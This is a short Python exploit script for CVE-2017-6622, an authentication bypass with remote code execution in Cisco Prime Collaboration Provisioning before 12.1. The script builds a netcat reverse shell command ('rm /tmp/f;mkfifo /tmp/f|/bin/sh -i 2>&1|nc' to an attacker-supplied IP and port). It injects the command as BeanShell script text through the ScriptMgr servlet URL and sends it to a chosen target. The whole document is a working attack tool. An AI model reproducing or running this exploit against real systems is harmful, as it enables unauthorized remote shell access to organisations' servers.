#!/usr/bin/python

"""
    CVE : 2017-6622

    Vulnerable Application:

        Cisco Prime Collaboration Provisioning < 12.1
        ScriptMgr Servlet Authentication Bypass w/ Remote Code Execution
    
"""

from sys import exit as sexit


__author__  = "Jack Cuthbertson"
__credits__ = "Adam Brown"
__version__ = "1.0.0"

__status__  = "Prototype"



def page_handler(url):

    from requests.exceptions import ConnectionError
    from requests import head

    try:
        head(url)
    except ConnectionError:
        print "[!] - Cannot find URL at specified host"

def encode(uri):

    from requests.utils import quote
    return quote(uri)

if __name__ == '__main__':

    from argparse import ArgumentParser
    
    parser = ArgumentParser()
    parser.add_argument("-a", "--ip", help="Attacker IP Address")
    parser.add_argument("-t", "--target", help="Target IP Address")
    parser.add_argument("-p", "--port", help="Attacker Port Address")
    args = parser.parse_args()

    if not args.target:
        print "[!] - Target IP address not supplied"
        parser.print_help()
        sexit()

    if not args.ip:
        print "[!] - Attacker IP address not supplied"
        parser.print_help()
        sexit()

    if not args.port:
        print "[!] - Attacker Port address not supplied"
        parser.print_help()
        sexit()
 
    #Encode parameters to be URL safe 
    bash_env = encode("/bin/bash")
    command_string = encode("rm /tmp/f;mkfifo /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f" % (args.ip, args.port))

    #Prepare the  shellcode for execution
    script_text = "Runtime.getRuntime().exec(new%20String[]{\"%s\ \", \ \"-c\",\"%s\"});)" % (bash_env, command_string)

    #submit malformed URL
    page_handler("https://%s/cupm/ScriptMgr?command=compile&language=bsh&script=foo&scripttext=%s" % (args.target, script_text))
